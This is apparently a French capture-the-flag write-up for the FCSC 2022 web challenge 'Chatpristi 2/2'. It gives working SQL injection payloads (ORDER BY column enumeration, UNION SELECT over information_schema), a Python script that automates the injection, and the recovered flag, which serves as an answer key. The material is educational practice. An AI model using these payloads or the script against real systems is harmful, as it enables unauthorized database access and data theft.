# Chatpristi 2/2

> Titre: Chatpristi 2/2  
> Auteur: [Cryptanalyse](https://twitter.com/Cryptanalyse)  
> Difficulté: 2  

## Description

Un ami m&rsquo;a fourni un site pour stocker mes memes, et il me dit qu&rsquo;il y a deux flags cachés dedans. Pouvez-vous m&rsquo;aider à les trouver ?
Cette épreuve est composée de deux parties :
Chatpristi 1/2. Chatpristi 2/2. 
## Objectif

Récupérer le flag.
## Analyse

Lors de la première partie, une vulnérabilité d’injection SQL avait été exploitée à l’aide du payload :

```sql
') OR TRUE --
```

Pour automatiser les tests et faciliter notre vie, j’ai développé un script Python permettant d’injecter dynamiquement des payloads SQL :

```python
# Automated SQL injectio
import urllib.parse

import bs4
import requests

URL = "http://localhost:8000"

# PAYLOAD INFO
PAYLOAD_PREFIX = "')"
PAYLOAD_SUFFIX = "--"


def inject(payload: str) -> str:
    encoded = urllib.parse.quote(payload)
    url = f"{URL}/?search={encoded}"

    try:
        r = requests.get(url)
        print(f"showing preview for {url}")
        return clean(r.text[:1000])
    except Exception as e:
        return f"Error: {e}"


def build_payload(payload: str) -> str:
    return f"{PAYLOAD_PREFIX} {payload} {PAYLOAD_SUFFIX}"


def clean(html):
    soup = bs4.BeautifulSoup(html, "html.parser")
    return soup.get_text()


def main():
    print("https://hackropole.fr/fr/challenges/web/fcsc2022-web-chatpristi-2/")

    while True:
        payload = input("sqli> ")

        if payload.lower() == "exit":
            break

        res = inject(build_payload(payload))
        print(res)

main()
```

On cherche desormais à trouver le nombre de colonnes. Pour cela, on utilise des payloads de type:

```sql
ORDER by 1
```

En incrémentant progressivement jusqu’à provoquer une erreur. À partir de :

```sql
ORDER by 4
```

Le serveur retourne:

```
pq: ORDER BY position 4 is not in select list
```

On en déduit que la requête comporte 3 colonnes.

On teste ensuite une requête `UNION SELECT` :

```sql
UNION SELECT 'a', 'b', 'c' FROM information_schema.columns
```

Cette tentative indique que la première colonne attend un entier. On ajuste donc :

```sql
UNION SELECT 1, 'b', column_name FROM information_schema.columns WHERE table_schema='public'
```

Ce qui permet d’identifier les colonnes suivantes :
- `id`
- `fstbg0adwb8f5upmg`
- `tags`
- `filename`

On liste alors les tables dans le schéma public

```sql
UNION SELECT 1, 'b', table_name FROM information_schema.tables WHERE table_schema='public'
```

Révélant l'existence des tables `___youw1lln3verfindmyfl4g___` et `memes`

Une fois les tables et colonnes connues, il suffit de chercher dans la table suspecte :

```sql
UNION SELECT 1, 'b', fstbg0adwb8f5upmg FROM ___youw1lln3verfindmyfl4g___
```

Le flag apparaît alors dans les résultats.
## Flag

FCSC{edfaeb139255929e55a3cffe9f3f37cd4e871e5015c4d4ade2b02d77d44019e5}